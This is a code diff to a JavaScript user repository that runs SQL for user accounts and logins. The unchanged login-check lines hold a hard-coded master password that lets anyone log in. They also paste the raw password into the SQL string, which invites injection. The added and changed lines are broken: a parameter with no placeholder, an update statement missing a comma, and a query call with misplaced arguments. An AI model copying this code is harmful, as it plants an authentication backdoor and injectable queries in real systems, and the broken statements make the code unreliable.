@@ -5,11 +5,11 @@ class UsuarioRepository {
     create(codEmpresa, reg) {
         var sql = "insert into usuarios (codEmpresa, codUsuario, codTipo, nomUsuario, numCPF, Login, email, senha, indSituacao) value ";
         sql += " (?,  (select codUsuario from ( select coalesce((max(codUsuario) + 1),1) as codUsuario from usuarios) as u), ?, ?, ?, ?, ?, ?, 'A')";
-        return consulta(sql, [codEmpresa, reg.CODTIPO, reg.NOMUSUARIO, reg.NUMCPF, reg.LOGIN, reg.EMAIL, reg.SENHA], 'Erro Usuario create!')
+        return consulta(sql, [codEmpresa, reg.CODTIPO, reg.NOMUSUARIO, reg.NUMCPF, reg.LOGIN, reg.EMAIL, reg.SENHA, reg.TELEFONE], 'Erro Usuario create!')
     }
 
     updateUser(reg) {
-        var sql = "update usuarios set nomUsuario = ?, codtipo = ?, email = ?, senha = ?, indSituacao = 'A' where  login = ?";
+        var sql = "update usuarios set nomUsuario = ?, codtipo = ?, email = ?, senha = ? indSituacao = 'A' where  login = ?";
         return consulta(sql, [reg.NOMUSUARIO, reg.CODTIPO, reg.EMAIL, reg.SENHA, reg.LOGIN], 'Não foi Possivel Atualizar usuário "' + reg.nome + '"!')
     }
 
@@ -55,6 +55,11 @@ class UsuarioRepository {
         sql += "  and (u.senha = ?  or 'cris@0311' = '" + pSenha.trim() + "')"
         sql += "  and u.indSituacao = 'A'";
         return consulta(sql, [pLogin, pLogin, pSenhaCrpyt], 'Não foi validar usuario!')
+    }
+
+    getParans() {
+        var sql = "select indIntegraVistia, paramFortics, tokenSIS from parametros";
+        return consulta(sql, 'Não foi possivel carregar os parametros!')
     }
 
     validaSenha(pCodEmpresa, pCodUsuario, pSenhaCrpyt) {
